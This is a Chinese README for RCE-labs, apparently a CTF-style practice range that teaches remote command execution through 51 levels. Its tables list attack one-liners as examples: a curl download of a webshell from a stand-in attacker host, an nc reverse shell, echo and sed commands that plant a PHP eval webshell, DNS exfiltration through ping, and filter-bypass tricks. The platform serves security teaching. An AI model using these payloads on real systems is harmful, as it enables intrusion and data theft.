# RCE-labs

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Docker Pulls](https://img.shields.io/docker/pulls/the0n3/rce-labs)](https://hub.docker.com/r/the0n3/rce-labs)
[![GitHub stars](https://img.shields.io/github/stars/Apursuit/rce-labs)](https://github.com/Apursuit/rce-labs)

**RCE-labs** 是一个面向 RCE（Remote Code Execution）漏洞利用入门的 CTF 靶场式学习平台。通过 50+ 由浅入深的实战关卡，系统覆盖了 Linux 命令审计、Shell 特性绕过滤、无回显 RCE 三大核心知识域。

![](/assets/1.png)

![](/assets/2.png)

## 目录

- [快速部署](#快速部署)
- [核心知识域](#核心知识域)
- [关卡一览](#关卡一览)
- [开发指南](#开发指南)
- [常见问题](#常见问题)
- [贡献](#贡献)
- [安全声明](#安全声明)
- [License](#license)

## 快速部署

### 前置准备

```bash
bash <(curl -sSL https://linuxmirrors.cn/main.sh)
```

> 一键配置 Linux 系统软件源，详见 [SuperManito/LinuxMirrors](https://github.com/SuperManito/LinuxMirrors)。

安装并配置 Docker：

```bash
bash <(curl -sSL https://linuxmirrors.cn/docker.sh)
```

> 含 Docker 安装与镜像加速器配置。仅需更换加速器时可单独运行：
> ```bash
> bash <(curl -sSL https://linuxmirrors.cn/docker.sh) --only-registry
> ```

### Docker（推荐）

```bash
docker run -d -p 8080:80 --name rce-labs the0n3/rce-labs:latest
```

访问 `http://localhost:8080`。

### Docker Compose

```bash
git clone https://github.com/Apursuit/rce-labs.git
cd rce-labs/docker
docker compose up -d
```

访问 `http://localhost:8080`。

> GitHub 访问受限时可替换 clone 地址为 `https://hk.gh-proxy.org/https://github.com/Apursuit/rce-labs.git`。

## 核心知识域

本平台围绕 RCE 漏洞利用中必要的基础知识，覆盖以下三个递进层次：

### 一、Linux 命令审计

掌握在受限 Shell 环境中读取、检索、传输文件所需的常用命令及其替代方案。每个关卡限制特定命令的执行环境，迫使学习者探索同一功能的不同实现路径。

| 命令 | 功能 | 典型用法 |
|---|---|---|
| `cat` / `tac` | 正向 / 倒序读取文件内容 | `cat /flag` |
| `head` / `tail` | 读取文件头部 / 尾部 | `tail -n 1 /flag` |
| `more` / `less` | 分页浏览文件 | `less /flag` |
| `nl` | 输出带行号的文件内容 | `nl /flag` |
| `sort` / `uniq` | 排序 / 去重输出 | `sort /flag` |
| `dd` | 跳过偏移、限定长度读取区块 | `dd if=/flag bs=1 skip=0` |
| `rev` | 逐行反转字符串（需两次 `rev` 还原） | `rev /flag \| rev` |
| `od` / `xxd` / `hexdump` | 以八进制 / 十六进制转储文件 | `xxd /flag` |
| `base32` / `base64` | Base 编解码 | `base64 /flag \| base64 -d` |
| `strings` | 提取文件中的可打印字符串 | `strings /flag` |
| `grep` | 正则匹配输出（`.` 匹配任意字符） | `grep . /flag` |
| `file` | 识别文件类型——通过 `-f` 参数报错泄露内容 | `file -f /flag` |
| `date` | 格式化输出——通过 `-f` 参数报错泄露内容 | `date -f /flag` |
| `diff` | 两文件逐行差异对比，侧面泄露内容 | `diff /flag /etc/passwd` |
| `find` | 递归搜索目录树定位目标文件 | `find / -name 'flag*'` |
| `cp` / `mv` | 复制 / 移动文件至 Web 可访问路径 | `cp /flag /var/www/html/out.txt` |
| `curl` / `wget` | 下载远程 payload 到本地 | `curl -o shell.php http://attacker.com/shell.txt` |
| `nc` / `ncat` | 建立 TCP 连接实现反弹 Shell | `nc attacker 4444 -e /bin/sh` |
| `sed` | 流编辑器——原地替换文件内容植入 Webshell | `sed -i 's/original/payload/' index.php` |
| `echo` | 通过输出重定向写入文件 | `echo '<?php eval(\$_POST[1]);?>' > shell.php` |
| `ping` | ICMP 探测——借助反引号将命令执行结果外带 DNS | `` ping -c 1 \`whoami\`.dnslog.cn `` |

### 二、Shell 特性与绕过滤

在真实的 RCE 场景中，WAF 或应用层过滤通常会限制命令关键字、参数分隔符或特殊符号。以下 Shell 特性可用于绕过这些防御。

| 特性 | 机制 | 绕过滤示例 |
|---|---|---|
| `?` | 单字符通配，匹配任意一个字符 | `cat /f???` |
| `*` | 多字符通配，匹配零到多个字符 | `cat /f*` |
| `;` / `&&` / `\|\|` | 命令分隔 / 逻辑串联 | `id;whoami` |
| `#` | 注释符——截断后续文本 | `echo -e "id\nwhoami" > x.sh; bash x.sh` |
| `Tab (%09)` | 制表符替代空格作为参数分隔 | `ls%09/` |
| `$IFS` / `${IFS}` | Shell 内部字段分隔符变量，等价于空格 | `cat${IFS}/flag` |
| `$` | 变量定义与引用，可拆分拼接关键字 | `a=l;b=s;$a$b` |
| `{cmd,param}` | Bash 花括号展开，由逗号分隔生成参数 | `{cat,/flag}` |
| `''` 单引号 | 抑制变量展开，拆分关键字字面量 | `c'a't /flag` |
| `""` 双引号 | 允许变量展开的同时拆分关键字 | `c""at /flag` |
| `\` 反斜杠 | 转义下一个字符，拆分关键字 | `c\at /flag` |
| `$@` | 位置参数展开，插入空串拆分关键字 | `c$@at /flag` |

### 三、无回显 RCE（Blind RCE）

当命令输出不直接呈现在 HTTP 响应中时，需要通过旁路手段获取执行结果。

| 手法 | 原理 | 适用场景 |
|---|---|---|
| 写 Webshell | 将执行结果重定向至 Web 可访问路径 | 有写权限 + Web 目录可达 |
| 反弹 Shell | 目标主动连接攻击机，传递交互式 Shell | 出网环境 |
| DNS/HTTP 外带（OOB） | 将命令结果拼接为域名或 URL 参数，通过 DNS 或 HTTP 请求传出 | 出网环境，无直接回显 |
| 时间盲注 | 根据命令是否执行成功产生不同延迟，二分或逐位推测结果 | 完全不出网 |
| 临时文件执行 | 将多行命令写入文件后 `bash` 执行，绕过单次输入限制 | 有写权限，限制一次性输入长度 |

---

## 关卡一览

> 51 个关卡按知识域分类排列。每个关卡锁定一项特定的命令或绕过技术，需要在该约束下完成 flag 读取。

<details>
<summary><strong>文件读取类</strong>（关卡 1–22）</summary>

| # | 关卡 | 知识要点 |
|:-:|:---|:---|
| 1 | `cat` | 基础文件读取 |
| 2 | `tac` | 倒序读取 |
| 3 | `head` | 头部 N 行输出 |
| 4 | `tail` | 尾部 N 行输出 |
| 5 | `more` | 分页浏览 |
| 6 | `less` | 分页浏览 |
| 7 | `nl` | 带行号输出 |
| 8 | `sort` | 排序输出 |
| 9 | `uniq` | 去重输出 |
| 10 | `dd` | 块截取读取 |
| 11 | `rev` | 字符串逐行反转 |
| 12 | `od` | 八进制转储 |
| 13 | `xxd` | 十六进制转储 |
| 14 | `hexdump` | 十六进制转储 |
| 15 | `base32` | Base32 编解码 |
| 16 | `base64` | Base64 编解码 |
| 17 | `strings` | 可打印串提取 |
| 18 | `grep` | 正则匹配泄露 |
| 19 | `file` | 报错信息泄露 |
| 20 | `date` | 报错信息泄露 |
| 21 | `diff` | 差异对比侧漏 |
| 22 | `find` | 文件路径搜索 |
</details>

<details>
<summary><strong>文件操作与网络类</strong>（关卡 23–31）</summary>

| # | 关卡 | 知识要点 |
|:-:|:---|:---|
| 23 | `cp` | 复制文件至可读目录 |
| 24 | `mv` | 移动/重命名文件 |
| 25 | `ping` | ICMP + 反引号 OOB 外带 |
| 26 | `curl` | HTTP 下载 payload |
| 27 | `echo` | 输出重定向写文件 |
| 28 | `wget` | 文件下载 |
| 29 | `nc` | 反弹 Shell |
| 30 | `ncat` | 反弹 Shell |
| 31 | `sed` | 流编辑植入 Webshell |
</details>

<details>
<summary><strong>绕过技巧类</strong>（关卡 32–50）</summary>

| # | 关卡 | 绕过目标 |
|:-:|:---|:---|
| 32 | `?` 通配符 | 文件名模糊匹配 |
| 33 | `*` 通配符 | 文件名模糊匹配 |
| 34 | `$` 变量拼接 | 关键字拆分 |
| 35 | `;` 命令分隔 | 单命令限制 |
| 36 | `&&` 命令串联 | 单命令限制 |
| 37 | `\|\|` 命令串联 | 单命令限制 |
| 38 | 反引号优先级 | 执行优先级 |
| 39 | `#` 注释符 | 后缀截断 |
| 40 | `\t` 制表符 | 空格过滤 |
| 41 | `$IFS` | 空格过滤 |
| 42 | `${IFS}` | 空格过滤 |
| 43 | `{cmd,param}` 花括号展开 | 空格过滤 |
| 44 | `'` 单引号拆分 | 关键字黑名单 |
| 45 | `"` 双引号拆分 | 关键字黑名单 |
| 46 | `?` 通配拆分 | 关键字黑名单 |
| 47 | `*` 通配拆分 | 关键字黑名单 |
| 48 | `\` 转义拆分 | 关键字黑名单 |
| 49 | `$@` 位置参数拆分 | 关键字黑名单 |
| 50 | `.` 点号绕过 | 关键字黑名单 |
</details>

<details>
<summary><strong>综合实战</strong>（关卡 51）</summary>

| # | 关卡 | 知识要点 |
|:-:|:---|:---|
| 51 | 无回显 RCE | 反弹 Shell / 写 Webshell / OOB 外带 |

</details>

## 开发指南

### 项目架构

```
rce-labs/
├── src/
│   ├── index.php          # 入口页（关卡导航）
│   ├── data.json           # 关卡元数据
│   ├── core/               # 公共逻辑（关卡框架）
│   ├── less-1/ ... less-51/ # 各关卡的独立目录
│   └── style.css           # 全局样式
├── config/
│   └── nginx.conf          # Nginx 配置
├── service/
│   └── docker-entrypoint.sh # 容器启动脚本
├── docker/
│   └── docker-compose.yaml # Docker Compose 编排
├── Dockerfile              # 镜像构建文件
└── deploy.sh               # 部署辅助脚本
```

### 添加新关卡

1. 在 `src/` 下创建 `less-N/` 目录
2. 将 `src/core/less-index.php` 复制到新目录并修改关卡逻辑
3. 更新 `src/data.json` 注册关卡元数据
4. 本地测试：

```bash
cd docker
docker compose up -d --build
```

## 常见问题

<details>
<summary><strong>端口 8080 被占用？</strong></summary>
 修改端口映射，例如 `docker run -p 9080:80` 或 compose 中改为 `9080:80`。
</details>

<details>
<summary><strong>Docker 拉取镜像缓慢？</strong></summary>
 参考上方[快速部署](#快速部署)中的镜像加速配置。
</details>

## 贡献

欢迎提交 Issue 反馈 bug 或建议新关卡、新的绕过技巧。Pull Request 请遵循以下约定：

1. 新关卡应放置在独立的 `less-N/` 目录，继承 `core/less-index.php` 的框架结构
2. `data.json` 中需同步更新关卡条目
3. 建议附带 Writeup 或提示信息

## 安全声明

本平台仅用于**网络安全教学与授权测试**。请勿将所学技术用于未经授权的系统攻击。使用者需自行承担由此产生的一切法律后果。

## License

[MIT](LICENSE) © Apursuit

